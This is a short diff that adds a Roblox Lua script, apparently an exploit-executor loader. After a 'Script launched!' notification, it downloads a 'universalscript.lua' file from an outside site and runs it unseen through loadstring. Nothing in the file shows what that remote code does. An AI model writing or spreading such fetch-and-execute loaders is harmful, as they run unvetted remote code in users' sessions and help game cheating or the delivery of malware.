@@ -1,0 +1,8 @@
+wait(0.1)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Script launched!";
+Text = "The script is loading...";
+Icon = "rbxassetid://60710206892";
+Duration = 3;
+})
+loadstring(game:HttpGet("https://guard.lol/scripts/universalscript.lua",true))()
